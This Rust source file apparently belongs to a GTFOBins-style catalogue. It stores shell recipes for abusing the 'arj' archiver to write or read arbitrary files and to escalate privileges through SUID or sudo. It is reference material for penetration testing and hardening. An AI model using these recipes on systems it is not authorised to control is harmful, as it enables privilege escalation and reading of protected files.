pub static BIN_NAME: &'static str = "arj";
pub static FW_DESC: &'static str = "The archive can also be prepared offline then uploaded.";
static FW_CODE: &'static str = r#"
    
    TF=$(mktemp -d)
    LFILE=file_to_write
    LDIR=where_to_write
    echo DATA >"$TF/$LFILE"
    arj a "$TF/a" "$TF/$LFILE"
    arj e "$TF/a" $LDIR
"#;
pub static FR_DESC: &'static str = "The file appears amid some other textual information. The archive can also be downloaded then extracted offline.";
static FR_CODE: &'static str = r#"
    
    TF=$(mktemp -u)
    LFILE=file_to_read
    arj a "$TF" "$LFILE"
    arj p "$TF"
"#;
pub static SUID_DESC: &'static str = "The archive can also be prepared offline then uploaded.";
static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which arj) .

    TF=$(mktemp -d)
    LFILE=file_to_write
    LDIR=where_to_write
    echo DATA >"$TF/$LFILE"
    arj a "$TF/a" "$TF/$LFILE"
    ./arj e "$TF/a" $LDIR
"#;
pub static SUDO_DESC: &'static str = "The archive can also be prepared offline then uploaded.";
static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp -d)
    LFILE=file_to_write
    LDIR=where_to_write
    echo DATA >"$TF/$LFILE"
    arj a "$TF/a" "$TF/$LFILE"
    sudo arj e "$TF/a" $LDIR
"#;
use crate::code::{Code, Tag};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
